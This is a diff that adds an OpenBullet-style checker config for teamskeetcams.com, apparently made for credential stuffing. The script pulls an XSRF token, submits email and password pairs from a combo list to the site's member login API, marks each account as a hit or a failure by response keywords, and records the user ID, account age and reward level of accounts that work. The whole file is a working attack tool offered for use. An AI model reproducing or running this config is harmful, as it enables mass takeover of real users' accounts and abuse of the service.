@@ -1,0 +1,98 @@
+[SETTINGS]
+{
+  "Name": "TeamSkeetCams",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-08T22:14:40.130781+01:00",
+  "AdditionalInfo": "",
+  "Author": "sp00f_X",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://teamskeetcams.com/api/member/login?Xld_rct=1&langchoice=fr" 
+  CONTENT "{}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: teamskeetcams.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "X-XSRF-TOKEN: " 
+  HEADER "Origin: https://teamskeetcams.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://teamskeetcams.com/?langchoice=fr" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+
+PARSE "<SOURCE>" LR "\"xsrfToken\":\"" "\"" -> VAR "token" 
+
+REQUEST POST "https://teamskeetcams.com/api/member/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"tzOffsetMinutes\":-60,\"siteId\":3946,\"referrerId\":502,\"smfid\":\"f3f394a5250b4b52b0fb7c2f20059073\",\"allowLoginRedirection\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: teamskeetcams.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "X-XSRF-TOKEN: <token>" 
+  HEADER "Origin: https://teamskeetcams.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://teamskeetcams.com/?langchoice=fr" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "sakey" 
+  KEYCHAIN Failure OR 
+    KEY "invalid params" 
+
+PARSE "<SOURCE>" JSON "account.userid" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "User ID" 
+
+PARSE "<SOURCE>" JSON "account.accountAgeSegment" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Account age" 
+
+PARSE "<SOURCE>" JSON "account.rewards.rewardsLevel" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Reward level" 
+
